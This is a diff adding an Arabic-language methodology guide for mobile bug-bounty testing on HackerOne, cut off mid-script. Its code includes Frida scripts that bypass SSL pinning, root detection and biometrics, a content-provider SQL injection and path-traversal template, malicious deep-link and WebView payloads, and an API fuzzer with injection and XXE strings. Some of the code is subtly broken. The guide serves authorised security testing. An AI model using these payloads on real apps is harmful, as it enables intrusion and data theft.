@@ -2900,4 +2900,1428 @@ class QuantumSafeEncryption {
 
 > 💡 **ملاحظة**: هذه المنهجية الشاملة تغطي تطور ثغرات أمان تطبيقات الموبايل على مدى 25 عامًا، مع التركيز على التغيرات التقنية والتهديدات الناشئة.
 
+# 🎯 المنهجية الاحترافية لـ Mobile Bug Bounty Hunting على HackerOne
 
+## 📱 الإعداد الاحترافي لبيئة الاختبار
+
+<details>
+<summary>🔧 1. المعدات الأساسية</summary>
+
+### Android Lab Setup
+- جهاز Android مع Root (Pixel/OnePlus recommended)
+- Android Emulator (Genymotion/Android Studio)
+- USB Debugging enabled
+- Magisk + MagiskHide
+- EdXposed Framework
+- Trust Me Already (cert unpinning)
+
+### iOS Lab Setup
+- iPhone Jailbroken (checkra1n/unc0ver)
+- iOS versions 14.x - 16.x
+- Cydia + Sileo
+- SSL Kill Switch 2
+- Filza File Manager
+- NewTerm 2
+- Flex 3
+
+</details>
+
+<details>
+<summary>🛠️ 2. أدوات الاختبار الأساسية</summary>
+
+### Network Analysis
+- Burp Suite Pro + Mobile Assistant
+- OWASP ZAP
+- mitmproxy
+- Wireshark
+- Charles Proxy
+
+### Static Analysis
+- MobSF
+- jadx
+- Ghidra
+- IDA Pro
+- Hopper Disassembler
+- APKTool
+- dex2jar
+
+### Dynamic Analysis
+- Frida + Objection
+- Cycript
+- Needle
+- Drozer
+- r2frida
+- House
+
+</details>
+
+## 🔍 المرحلة 1: Reconnaissance & Information Gathering
+
+<details>
+<summary>📋 1.1 Target Enumeration</summary>
+
+### جمع معلومات عن الشركة
+- Scope في HackerOne
+- سياسة الثغرات المقبولة
+- الثغرات المستثناة (Out of Scope)
+- مكافآت كل نوع من الثغرات
+
+### معلومات التطبيق
+- اسم الحزمة (Package Name)
+- إصدارات التطبيق المختلفة
+- مكتبات الطرف الثالث
+- Backend APIs
+- Subdomains المرتبطة
+- CDNs المستخدمة
+
+</details>
+
+<details>
+<summary>📥 1.2 Application Download & Analysis</summary>
+
+```bash
+# تحميل التطبيق
+# Android
+adb pull $(adb shell pm path com.target.app | cut -d: -f2)
+# أو من APKPure, APKMirror, APKCombo
+
+# iOS
+ipatool download -b com.target.app -e email@example.com -p password
+# أو من Apple Configurator 2
+```
+
+</details>
+
+<details>
+<summary>🔎 1.3 Initial Recon Script</summary>
+
+```python
+#!/usr/bin/env python3
+import requests
+import subprocess
+import json
+from bs4 import BeautifulSoup
+
+class MobileRecon:
+    def __init__(self, package_name):
+        self.package_name = package_name
+        self.results = {}
+    
+    def get_app_info(self):
+        """جمع معلومات التطبيق من Play Store"""
+        url = f"https://play.google.com/store/apps/details?id={self.package_name}"
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        self.results['version'] = soup.find('div', {'class': 'IQ1z0d'}).text
+        self.results['developer'] = soup.find('div', {'class': 'qQKdcc'}).text
+        self.results['downloads'] = soup.find('div', {'class': 'ClM7O'}).text
+    
+    def extract_apk_info(self, apk_path):
+        """استخراج معلومات APK"""
+        cmd = f"aapt dump badging {apk_path}"
+        output = subprocess.check_output(cmd, shell=True).decode()
+        
+        self.results['permissions'] = []
+        for line in output.splitlines():
+            if 'uses-permission' in line:
+                perm = line.split("'")[1]
+                self.results['permissions'].append(perm)
+    
+    def find_subdomains(self):
+        """البحث عن Subdomains"""
+        domain = self.package_name.split('.')[1] + '.' + self.package_name.split('.')[0]
+        # استخدام أدوات مثل Sublist3r, Amass
+        self.results['subdomains'] = []
+    
+    def generate_report(self):
+        """إنشاء تقرير JSON"""
+        with open('recon_report.json', 'w') as f:
+            json.dump(self.results, f, indent=4)
+```
+
+</details>
+
+## 🔬 المرحلة 2: Static Analysis - البحث عن الثغرات
+
+<details>
+<summary>🔓 2.1 فك التشفير والتحليل</summary>
+
+```bash
+# Android APK Decompilation
+apktool d -r -s target.apk -o target_decoded
+jadx --show-bad-code target.apk -d jadx_output
+d2j-dex2jar.sh target.apk -o target.jar
+
+# iOS IPA Analysis
+unzip target.ipa
+cd Payload/App.app
+class-dump Target -o class_dump_output
+otool -L Target
+nm Target | grep -i "security\|crypt\|auth"
+```
+
+</details>
+
+<details>
+<summary>🔍 2.2 Automated Vulnerability Scanning</summary>
+
+```python
+#!/usr/bin/env python3
+
+class VulnerabilityScanner:
+    def __init__(self, app_path):
+        self.app_path = app_path
+        self.vulnerabilities = []
+    
+    def scan_for_secrets(self):
+        """البحث عن API Keys والأسرار"""
+        secret_patterns = {
+            'AWS': r'(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
+            'Firebase': r'AIza[0-9A-Za-z_-]{35}',
+            'Private Key': r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
+            'Google OAuth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
+            'GitHub': r'gh[pousr]_[A-Za-z0-9_]{36,255}',
+            'Generic API': r'[aA][pP][iI]_?[kK][eE][yY].*[\'\"]\s*[:=]\s*[\'\"]\w{32,45}[\'"]',
+            'JWT': r'ey[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
+            'Slack Token': r'xox[abpr]-[0-9a-fA-F]{8,}',
+            'Generic Secret': r'[sS][eE][cC][rR][eE][tT].*[\'\"]\s*[:=]\s*[\'\"]\w{10,}[\'"]'
+        }
+        
+        # البحث في الملفات
+        import re
+        import os
+        
+        for root, dirs, files in os.walk(self.app_path):
+            for file in files:
+                if file.endswith(('.java', '.xml', '.json', '.js', '.kt', '.swift')):
+                    file_path = os.path.join(root, file)
+                    with open(file_path, 'r', errors='ignore') as f:
+                        content = f.read()
+                        for key, pattern in secret_patterns.items():
+                            matches = re.finditer(pattern, content)
+                            for match in matches:
+                                self.vulnerabilities.append({
+                                    'type': f'Hardcoded {key}',
+                                    'file': file_path,
+                                    'value': match.group(0),
+                                    'severity': 'HIGH'
+                                })
+    
+    def check_insecure_storage(self):
+        """فحص التخزين غير الآمن"""
+        storage_issues = []
+        
+        # SharedPreferences
+        prefs_pattern = r'getSharedPreferences\([^,]+,\s*[0-9]+\)'
+        mode_world_readable = r'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE'
+        
+        # SQLite
+        sqlite_pattern = r'openOrCreateDatabase\([^,]+,\s*[0-9]+\)'
+        raw_query = r'rawQuery\(|execSQL\('
+        
+        # تخزين البيانات الحساسة
+        sensitive_data = r'(password|token|secret|key|credential).*=.*[\'"](.+)[\'"]'
+        
+        # إضافة النتائج للتقرير
+        return storage_issues
+        
+    def analyze_network_security(self):
+        """تحليل أمان الشبكة"""
+        network_issues = []
+        
+        # HTTP vs HTTPS
+        http_pattern = r'http://'
+        
+        # SSL Pinning
+        ssl_patterns = [
+            'TrustManager',
+            'SSLSocketFactory', 
+            'HostnameVerifier',
+            'checkServerTrusted',
+            'ALLOW_ALL_HOSTNAME_VERIFIER'
+        ]
+        
+        # Certificate Validation
+        cert_validation = r'setDefaultHostnameVerifier|SSLContext'
+        
+        return network_issues
+```
+
+</details>
+
+<details>
+<summary>🔎 2.3 البحث عن الثغرات الكلاسيكية</summary>
+
+### M1: Improper Platform Usage
+```bash
+# فحص AndroidManifest.xml
+grep -E "exported=\"true\"|permission=\"\"" AndroidManifest.xml
+
+# فحص المكونات المكشوفة
+python3 find_exported_components.py target_decoded/AndroidManifest.xml
+```
+
+### M2: Insecure Data Storage
+```python
+def check_data_storage():
+    vulnerabilities = []
+    
+    # SharedPreferences
+    if find_pattern('MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE'):
+        vulnerabilities.append('World readable SharedPreferences')
+    
+    # External Storage
+    if find_pattern('getExternalStorageDirectory\(\)|getExternalFilesDir\(\)'):
+        vulnerabilities.append('Data stored on external storage')
+    
+    # SQLite without encryption
+    if find_pattern('SQLiteDatabase') and not find_pattern('SQLCipher'):
+        vulnerabilities.append('Unencrypted SQLite database')
+    
+    # Logging sensitive data
+    if find_pattern('Log\.(d|e|i|v|w)\(.*(password|token|key)'):
+        vulnerabilities.append('Sensitive data in logs')
+    
+    return vulnerabilities
+```
+
+</details>
+
+## ⚡ المرحلة 3: Dynamic Analysis - الاختبار الديناميكي
+
+<details>
+<summary>📱 3.1 إعداد الجهاز للاختبار</summary>
+
+```bash
+# Android Setup
+adb root
+adb shell settings put global http_proxy 192.168.1.100:8080
+adb push burp_cert.crt /sdcard/
+adb shell "su -c 'cp /sdcard/burp_cert.crt /system/etc/security/cacerts/'"
+
+# iOS Setup
+ssh root@device_ip
+dpkg -i com.nablac0d3.sslkillswitch2.deb
+killall -HUP SpringBoard
+```
+
+</details>
+
+<details>
+<summary>💻 3.2 Frida Scripts للاختبار</summary>
+
+```javascript
+// SSL Pinning Bypass Universal
+Java.perform(function() {
+    var array_list = Java.use("java.util.ArrayList");
+    var ApiClient = Java.use('com.android.org.conscrypt.TrustManagerImpl');
+    
+    ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) {
+        console.log('[+] SSL Pinning Bypassed');
+        return array_list.$new();
+    };
+});
+
+// Root Detection Bypass
+Java.perform(function() {
+    var RootPackages = ["com.topjohnwu.magisk", "com.noshufou.android.su", 
+                       "eu.chainfire.supersu", "com.koushikdutta.superuser"];
+    
+    var RootBinaries = ["su", "busybox", "magisk", "supersu"];
+    
+    var Runtime = Java.use('java.lang.Runtime');
+    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
+        if (RootBinaries.indexOf(cmd) != -1) {
+            console.log('[+] Root check bypassed for: ' + cmd);
+            return null;
+        }
+        return this.exec(cmd);
+    };
+});
+
+// Biometric Authentication Bypass
+Java.perform(function() {
+    var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
+    
+    BiometricPrompt.onAuthenticationSucceeded.implementation = function(result) {
+        console.log('[+] Biometric Auth Bypass - Success forced');
+        this.onAuthenticationSucceeded(result);
+    };
+});
+```
+
+</details>
+
+<details>
+<summary>🌐 3.3 Network Traffic Analysis</summary>
+
+```python
+#!/usr/bin/env python3
+from mitmproxy import http
+import json
+
+class APIAnalyzer:
+    def __init__(self):
+        self.api_calls = []
+        self.sensitive_data = []
+    
+    def request(self, flow: http.HTTPFlow):
+        # تحليل الطلبات
+        if "api.target.com" in flow.request.pretty_host:
+            api_call = {
+                'method': flow.request.method,
+                'url': flow.request.pretty_url,
+                'headers': dict(flow.request.headers),
+                'body': flow.request.text
+            }
+            
+            # البحث عن بيانات حساسة
+            if any(keyword in flow.request.text.lower() for keyword in 
+                   ['password', 'token', 'credit_card', 'ssn']):
+                self.sensitive_data.append(api_call)
+            
+            # تحليل Headers
+            if 'Authorization' in flow.request.headers:
+                auth_header = flow.request.headers['Authorization']
+                if auth_header.startswith('Basic'):
+                    # Basic Auth detected
+                    self.log_vulnerability('Basic Auth in use', 'MEDIUM')
+            
+            # فحص HTTPS
+            if flow.request.scheme == "http":
+                self.log_vulnerability('Unencrypted HTTP traffic', 'HIGH')
+    
+    def response(self, flow: http.HTTPFlow):
+        # تحليل الاستجابات
+        if "api.target.com" in flow.request.pretty_host:
+            try:
+                json_response = json.loads(flow.response.text)
+                # البحث عن معلومات حساسة في الاستجابة
+                self.analyze_response_data(json_response)
+            except:
+                pass
+    
+    def analyze_response_data(self, data):
+        # تحليل البيانات بشكل عميق
+        if isinstance(data, dict):
+            for key, value in data.items():
+                if key.lower() in ['password', 'token', 'api_key', 'secret']:
+                    self.log_vulnerability(f'Sensitive data in response: {key}', 'HIGH')
+```
+
+</details>
+
+## 🚀 المرحلة 4: Exploitation - استغلال الثغرات
+
+<details>
+<summary>💥 4.1 قوالب Exploit جاهزة</summary>
+
+### Content Provider Injection
+```java
+public class ContentProviderExploit extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        // SQL Injection
+        Uri uri = Uri.parse("content://com.target.provider/users");
+        String[] projection = {"username", "password"};
+        String selection = "username = 'admin' OR '1'='1'";
+        
+        Cursor cursor = getContentResolver().query(uri, projection, selection, null, null);
+        
+        if (cursor != null && cursor.moveToFirst()) {
+            do {
+                String username = cursor.getString(0);
+                String password = cursor.getString(1);
+                Log.d("EXPLOIT", "Found: " + username + ":" + password);
+            } while (cursor.moveToNext());
+        }
+        
+        // Path Traversal
+        Uri fileUri = Uri.parse("content://com.target.provider/files/../../../../etc/hosts");
+        try {
+            InputStream is = getContentResolver().openInputStream(fileUri);
+            // قراءة محتوى الملف
+        } catch (Exception e) {
+            Log.e("EXPLOIT", "Path traversal failed", e);
+        }
+    }
+}
+```
+
+### Deep Link Exploitation
+```python
+#!/usr/bin/env python3
+import subprocess
+import urllib.parse
+
+def generate_deep_link_payloads(scheme, host):
+    payloads = [
+        f"{scheme}://{host}/admin",
+        f"{scheme}://{host}/../../etc/passwd",
+        f"{scheme}://{host}/reset_password?token=AAAA",
+        f"{scheme}://{host}/webview?url=javascript:alert(1)",
+        f"{scheme}://{host}/login?redirect=http://evil.com",
+        f"{scheme}://{host}/api/v1/users/1%0d%0aX-Auth-Token:%20malicious",
+    ]
+    
+    for payload in payloads:
+        cmd = f"adb shell am start -W -a android.intent.action.VIEW -d \"{payload}\""
+        print(f"[+] Testing: {payload}")
+        subprocess.run(cmd, shell=True)
+```
+
+### WebView Exploitation
+```javascript
+// JavaScript Interface Exploitation
+function exploitWebView() {
+    // إذا كان هناك JavaScript Interface
+    if (window.Android) {
+        // محاولة تنفيذ أوامر
+        window.Android.execute("id");
+        window.Android.getPrivateData();
+    }
+    
+    // XSS عبر WebView
+    var payload = "javascript:alert(document.cookie)";
+    window.location = payload;
+    
+    // محاولة قراءة ملفات محلية
+    var filePayload = "file:///data/data/com.target.app/shared_prefs/secrets.xml";
+    window.location = filePayload;
+}
+```
+
+</details>
+
+<details>
+<summary>🔬 4.2 Advanced Exploitation Techniques</summary>
+
+### Memory Corruption في Native Libraries
+```python
+#!/usr/bin/env python3
+import frida
+import sys
+
+def on_message(message, data):
+    print(f"[*] {message}")
+
+session = frida.get_usb_device().attach("com.target.app")
+script = session.create_script("""
+    // البحث عن دوال Native معرضة للخطر
+    var natives = Process.enumerateModules();
+    natives.forEach(function(module) {
+        if (module.name.includes("libnative")) {
+            Module.enumerateExports(module.name, {
+                onMatch: function(exp) {
+                    if (exp.name.includes("strcpy") || exp.name.includes("sprintf")) {
+                        console.log('[!] Vulnerable function found: ' + exp.name);
+                        Interceptor.attach(exp.address, {
+                            onEnter: function(args) {
+                                console.log('[*] ' + exp.name + ' called');
+                                // فحص المعاملات
+                            }
+                        });
+                    }
+                },
+                onComplete: function() {}
+            });
+        }
+    });
+    
+    // Fuzzing Native Functions
+    function fuzzNativeFunction(address) {
+        var payloads = [
+            "A".repeat(1000),
+            "%s%s%s%s%s",
+            "\\x00\\x00\\x00\\x00",
+            "\\xff\\xff\\xff\\xff"
+        ];
+        
+        payloads.forEach(function(payload) {
+            try {
+                new NativeFunction(address, 'void', ['pointer'])
+                    (Memory.allocUtf8String(payload));
+            } catch(e) {
+                console.log('[!] Crash with payload: ' + payload);
+            }
+        });
+    }
+""")
+script.on('message', on_message)
+script.load()
+sys.stdin.read()
+```
+
+</details>
+
+## 📝 المرحلة 5: Documentation & Reporting
+
+<details>
+<summary>📋 5.1 قالب تقرير HackerOne احترافي</summary>
+
+```markdown
+# [Company] Mobile App Security Vulnerability
+
+## Summary
+[وصف مختصر للثغرة وتأثيرها]
+
+## Steps To Reproduce
+1. Install the app version X.X.X from Play Store
+2. Set up proxy with Burp Suite
+3. Navigate to Settings > Account
+4. Observe the request to `/api/v1/user/profile`
+5. Note the sensitive data in response
+
+## Supporting Material/References
+- Screenshot_1.png: Shows the sensitive data exposure
+- Video_POC.mp4: Full reproduction steps
+- Burp_Request.txt: Raw HTTP request/response
+
+## Impact
+This vulnerability allows an attacker to:
+- Access sensitive user information
+- Potentially perform account takeover
+- Violate user privacy
+
+## Remediation
+- Implement proper access controls
+- Remove sensitive data from API responses
+- Use HTTPS for all communications
+
+## Technical Details
+```json
+// Request
+GET /api/v1/user/profile HTTP/1.1
+Host: api.target.com
+Authorization: Bearer eyJhbGci...
+
+// Response
+{
+  "user_id": 12345,
+  "email": "user@example.com",
+  "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
+  "credit_card": "4111-1111-1111-1111",
+  "ssn": "123-45-6789"
+}
+```
+
+## CVSS Score
+CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5 Medium)
+```
+
+</details>
+
+<details>
+<summary>🔧 5.2 أدوات إنشاء التقارير التلقائية</summary>
+
+```python
+#!/usr/bin/env python3
+import json
+import datetime
+from jinja2 import Template
+
+class BugBountyReporter:
+    def __init__(self, findings):
+        self.findings = findings
+        self.template = """
+# Bug Bounty Report - {{ date }}
+
+## Executive Summary
+Total vulnerabilities found: {{ total_vulns }}
+Critical: {{ critical_count }}
+High: {{ high_count }}
+Medium: {{ medium_count }}
+Low: {{ low_count }}
+
+## Detailed Findings
+
+{% for vuln in vulnerabilities %}
+### {{ loop.index }}. {{ vuln.title }}
+**Severity**: {{ vuln.severity }}
+**CVSS**: {{ vuln.cvss }}
+**Category**: {{ vuln.category }}
+
+**Description**:
+{{ vuln.description }}
+
+**Impact**:
+{{ vuln.impact }}
+
+**Steps to Reproduce**:
+{% for step in vuln.steps %}
+{{ loop.index }}. {{ step }}
+{% endfor %}
+
+**Proof of Concept**:
+```
+{{ vuln.poc }}
+```
+
+**Remediation**:
+{{ vuln.remediation }}
+
+---
+{% endfor %}
+"""
+    
+    def generate_report(self):
+        template = Template(self.template)
+        report_data = {
+            'date': datetime.datetime.now().strftime("%Y-%m-%d"),
+            'total_vulns': len(self.findings),
+            'critical_count': len([v for v in self.findings if v['severity'] == 'Critical']),
+            'high_count': len([v for v in self.findings if v['severity'] == 'High']),
+            'medium_count': len([v for v in self.findings if v['severity'] == 'Medium']),
+            'low_count': len([v for v in self.findings if v['severity'] == 'Low']),
+            'vulnerabilities': self.findings
+        }
+        
+        report = template.render(report_data)
+        with open('bug_bounty_report.md', 'w') as f:
+            f.write(report)
+```
+
+</details>
+
+## 🛠️ المرحلة 6: Automation & Tools Development
+
+<details>
+<summary>🤖 6.1 أداة فحص شاملة</summary>
+
+```python
+#!/usr/bin/env python3
+import subprocess
+import os
+import json
+import argparse
+from concurrent.futures import ThreadPoolExecutor
+
+class MobileBugHunter:
+    def __init__(self, apk_path):
+        self.apk_path = apk_path
+        self.package_name = self.get_package_name()
+        self.vulnerabilities = []
+        
+    def get_package_name(self):
+        """استخراج اسم الحزمة"""
+        cmd = f"aapt dump badging {self.apk_path} | grep package"
+        output = subprocess.check_output(cmd, shell=True).decode()
+        return output.split("'")[1]
+    
+    def decompile_app(self):
+        """فك تشفير التطبيق"""
+        print("[+] Decompiling APK...")
+        subprocess.run(f"apktool d -f {self.apk_path} -o decompiled", shell=True)
+        subprocess.run(f"jadx --no-res {self.apk_path} -d jadx_output", shell=True)
+    
+    def run_mobsf_scan(self):
+        """تشغيل MobSF scan"""
+        print("[+] Running MobSF scan...")
+        # API call to MobSF
+        pass
+    
+    def find_api_endpoints(self):
+        """البحث عن API endpoints"""
+        endpoints = []
+        for root, dirs, files in os.walk("jadx_output"):
+            for file in files:
+                if file.endswith(".java"):
+                    with open(os.path.join(root, file), 'r', errors='ignore') as f:
+                        content = f.read()
+                        # البحث عن URLs
+                        import re
+                        urls = re.findall(r'https?://[\w\-\.]+(?:/[\w\-\./?%&=]*)?', content)
+                        endpoints.extend(urls)
+        return list(set(endpoints))
+    
+    def check_root_detection(self):
+        """فحص Root Detection"""
+        root_checks = [
+            "test-keys",
+            "/system/app/Superuser.apk",
+            "/system/xbin/su",
+            "RootDetection",
+            "isRooted",
+            "detectRoot"
+        ]
+        
+        for check in root_checks:
+            cmd = f"grep -r '{check}' jadx_output/"
+            result = subprocess.run(cmd, shell=True, capture_output=True)
+            if result.stdout:
+                self.vulnerabilities.append({
+                    'type': 'Root Detection',
+                    'description': f'Root detection found: {check}',
+                    'severity': 'Low'
+                })
+    
+    def check_ssl_pinning(self):
+        """فحص SSL Pinning"""
+        ssl_keywords = [
+            "TrustManager",
+            "HostnameVerifier",
+            "SSLSocketFactory",
+            "checkServerTrusted",
+            "X509TrustManager"
+        ]
+        
+        for keyword in ssl_keywords:
+            cmd = f"grep -r '{keyword}' jadx_output/"
+            result = subprocess.run(cmd, shell=True, capture_output=True)
+            if result.stdout:
+                self.vulnerabilities.append({
+                    'type': 'SSL Pinning',
+                    'description': f'SSL configuration found: {keyword}',
+                    'severity': 'Medium'
+                })
+    
+    def run_dynamic_analysis(self):
+        """تشغيل التحليل الديناميكي"""
+        print("[+] Starting dynamic analysis...")
+        
+        # تثبيت التطبيق
+        subprocess.run(f"adb install {self.apk_path}", shell=True)
+        
+        # تشغيل Frida scripts
+        frida_scripts = [
+            "ssl_pinning_bypass.js",
+            "root_detection_bypass.js",
+            "api_monitor.js",
+            "crypto_monitor.js"
+        ]
+        
+        for script in frida_scripts:
+            if os.path.exists(script):
+                cmd = f"frida -U -f {self.package_name} -l {script} --no-pause"
+                # تشغيل في background
+                subprocess.Popen(cmd, shell=True)
+    
+    def generate_report(self):
+        """إنشاء التقرير النهائي"""
+        report = {
+            'app_name': self.package_name,
+            'scan_date': datetime.datetime.now().isoformat(),
+            'vulnerabilities': self.vulnerabilities,
+            'api_endpoints': self.find_api_endpoints()
+        }
+        
+        with open('scan_report.json', 'w') as f:
+            json.dump(report, f, indent=4)
+        
+        # إنشاء تقرير Markdown
+        self.create_markdown_report(report)
+    
+    def create_markdown_report(self, report):
+        """إنشاء تقرير Markdown"""
+        md_content = f"""# Mobile App Security Assessment Report
+
+## Application: {report['app_name']}
+## Date: {report['scan_date']}
+
+## Executive Summary
+Total vulnerabilities found: {len(report['vulnerabilities'])}
+
+## Vulnerabilities
+
+"""
+        for i, vuln in enumerate(report['vulnerabilities'], 1):
+            md_content += f"""### {i}. {vuln['type']}
+**Severity**: {vuln['severity']}
+**Description**: {vuln['description']}
+
+---
+"""
+        
+        with open('security_report.md', 'w') as f:
+            f.write(md_content)
+    
+    def run_full_scan(self):
+        """تشغيل الفحص الكامل"""
+        print(f"[+] Starting full scan of {self.package_name}")
+        
+        # المهام المتوازية
+        with ThreadPoolExecutor(max_workers=4) as executor:
+            executor.submit(self.decompile_app)
+            executor.submit(self.run_mobsf_scan)
+            executor.submit(self.check_root_detection)
+            executor.submit(self.check_ssl_pinning)
+        
+        self.run_dynamic_analysis()
+        self.generate_report()
+        
+        print("[+] Scan completed! Check security_report.md")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Mobile Bug Bounty Hunter')
+    parser.add_argument('apk', help='Path to APK file')
+    args = parser.parse_args()
+    
+    hunter = MobileBugHunter(args.apk)
+    hunter.run_full_scan()
+```
+
+</details>
+
+## 🎯 المرحلة 7: Advanced Techniques & Tips
+
+<details>
+<summary>⚡ 7.1 تقنيات متقدمة للبحث عن الثغرات</summary>
+
+### 1. API Fuzzing
+```python
+#!/usr/bin/env python3
+import requests
+import itertools
+import json
+
+class APIFuzzer:
+    def __init__(self, base_url, auth_token):
+        self.base_url = base_url
+        self.headers = {
+            'Authorization': f'Bearer {auth_token}',
+            'Content-Type': 'application/json'
+            }
+        self.payloads = self.load_payloads()
+    
+    def load_payloads(self):
+        """تحميل payloads للاختبار"""
+        return {
+            'sqli': ["' OR '1'='1", "1' UNION SELECT NULL--", "1' AND 1=2--"],
+            'xss': ["<script>alert(1)</script>", "javascript:alert(1)", "<img src=x onerror=alert(1)>"],
+            'xxe': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
+            'idor': ["1", "0", "-1", "999999", "1.1", "true", "false", "null"],
+            'path_traversal': ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2f"],
+            'command_injection': ["; id", "| id", "|| id", "` id`", "$( id )"],
+            'ssti': ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
+            'format_string': ["%s", "%x", "%n", "%d", "%p"]
+        }
+    
+    def fuzz_endpoint(self, endpoint, method='GET', params=None):
+        """اختبار endpoint معين"""
+        vulnerabilities = []
+        url = f"{self.base_url}{endpoint}"
+        
+        for vuln_type, payloads in self.payloads.items():
+            for payload in payloads:
+                if method == 'GET' and params:
+                    for param in params:
+                        test_params = params.copy()
+                        test_params[param] = payload
+                        try:
+                            response = requests.get(url, params=test_params, headers=self.headers)
+                            if self.detect_vulnerability(response, vuln_type, payload):
+                                vulnerabilities.append({
+                                    'endpoint': endpoint,
+                                    'method': method,
+                                    'parameter': param,
+                                    'vulnerability': vuln_type,
+                                    'payload': payload
+                                })
+                        except Exception as e:
+                            print(f"Error testing {endpoint}: {e}")
+                
+                elif method == 'POST':
+                    try:
+                        response = requests.post(url, json={key: payload for key in params}, headers=self.headers)
+                        if self.detect_vulnerability(response, vuln_type, payload):
+                            vulnerabilities.append({
+                                'endpoint': endpoint,
+                                'method': method,
+                                'vulnerability': vuln_type,
+                                'payload': payload
+                            })
+                    except Exception as e:
+                        print(f"Error testing {endpoint}: {e}")
+        
+        return vulnerabilities
+    
+    def detect_vulnerability(self, response, vuln_type, payload):
+        """كشف الثغرة بناءً على الاستجابة"""
+        indicators = {
+            'sqli': ['SQL syntax', 'mysql_fetch', 'Warning: mysql', 'MySQLSyntaxErrorException'],
+            'xss': [payload, 'alert(1)', '<script>'],
+            'xxe': ['root:', '/etc/passwd', 'ENTITY'],
+            'path_traversal': ['root:', 'boot.ini', '[fonts]'],
+            'command_injection': ['uid=', 'gid=', 'groups='],
+            'ssti': ['49', '7777777'],
+            'idor': ['"id":', 'user_id', 'unauthorized']
+        }
+        
+        if vuln_type in indicators:
+            for indicator in indicators[vuln_type]:
+                if indicator in response.text:
+                    return True
+        
+        # فحص رموز الحالة
+        if response.status_code in [500, 503] and vuln_type in ['sqli', 'command_injection']:
+            return True
+            
+        return False
+```
+
+### 2. Reverse Engineering متقدم
+```python
+#!/usr/bin/env python3
+import r2pipe
+import os
+
+class AdvancedReverser:
+    def __init__(self, binary_path):
+        self.r2 = r2pipe.open(binary_path)
+        self.r2.cmd('aaa')  # تحليل كامل
+    
+    def find_crypto_functions(self):
+        """البحث عن دوال التشفير"""
+        crypto_patterns = [
+            'aes', 'des', 'rsa', 'md5', 'sha', 'encrypt', 'decrypt',
+            'cipher', 'hash', 'hmac', 'pbkdf', 'random'
+        ]
+        
+        functions = []
+        for pattern in crypto_patterns:
+            result = self.r2.cmd(f'afl~{pattern}')
+            if result:
+                functions.extend(result.splitlines())
+        
+        return functions
+    
+    def analyze_native_functions(self):
+        """تحليل الدوال Native"""
+        native_functions = self.r2.cmd('afl~native')
+        vulnerable_funcs = []
+        
+        for func in native_functions.splitlines():
+            # تحليل الدالة
+            self.r2.cmd(f's {func.split()[0]}')
+            disasm = self.r2.cmd('pdf')
+            
+            # البحث عن دوال خطرة
+            if any(vuln in disasm for vuln in ['strcpy', 'strcat', 'sprintf', 'gets']):
+                vulnerable_funcs.append({
+                    'function': func,
+                    'vulnerability': 'Buffer Overflow Risk'
+                })
+        
+        return vulnerable_funcs
+    
+    def extract_strings(self):
+        """استخراج النصوص المهمة"""
+        strings = self.r2.cmd('iz')
+        sensitive_strings = []
+        
+        patterns = [
+            'password', 'secret', 'key', 'token', 'api',
+            'http://', 'https://', 'ftp://', 'ssh://',
+            'BEGIN PRIVATE KEY', 'BEGIN RSA PRIVATE KEY'
+        ]
+        
+        for line in strings.splitlines():
+            for pattern in patterns:
+                if pattern.lower() in line.lower():
+                    sensitive_strings.append(line)
+        
+        return sensitive_strings
+```
+
+</details>
+
+<details>
+<summary>💡 7.2 نصائح احترافية لـ Bug Bounty</summary>
+
+### 1. استراتيجية البحث
+```markdown
+## استراتيجية الـ 80/20
+
+### 80% - الثغرات الشائعة عالية التأثير
+- IDOR (Insecure Direct Object Reference)
+- Broken Access Control
+- Information Disclosure
+- SQL Injection
+- XSS (خاصة في WebViews)
+
+### 20% - الثغرات المعقدة والنادرة
+- Race Conditions
+- Business Logic Flaws
+- Cryptographic Issues
+- Memory Corruption
+- Advanced SSRF
+```
+
+### 2. قائمة الفحص السريع
+```python
+def quick_vulnerability_check():
+    checklist = {
+        'High Impact': [
+            'Test all API endpoints for IDOR',
+            'Check for hardcoded secrets in APK',
+            'Test authentication bypass scenarios',
+            'Look for sensitive data in logs',
+            'Test file upload functionality'
+        ],
+        'Medium Impact': [
+            'Check SSL pinning implementation',
+            'Test deep links for vulnerabilities',
+            'Analyze WebView configurations',
+            'Check for exported components',
+            'Test input validation'
+        ],
+        'Low Impact': [
+            'Check for outdated libraries',
+            'Test error messages for info leakage',
+            'Check backup settings',
+            'Test clipboard usage',
+            'Analyze permissions'
+        ]
+    }
+    return checklist
+```
+
+</details>
+
+<details>
+<summary>🛠️ 7.3 أدوات مخصصة للـ Bug Bounty</summary>
+
+### 1. Mobile App Recon Tool
+```python
+#!/usr/bin/env python3
+import requests
+import json
+import subprocess
+from bs4 import BeautifulSoup
+
+class MobileAppRecon:
+    def __init__(self, package_name):
+        self.package_name = package_name
+        self.results = {}
+    
+    def google_play_info(self):
+        """جمع معلومات من Google Play"""
+        url = f"https://play.google.com/store/apps/details?id={self.package_name}"
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        self.results['developer'] = soup.find('a', {'class': 'hrTbp R8zArc'}).text
+        self.results['category'] = soup.find('span', {'class': 'T32cc UAO9ie'}).text
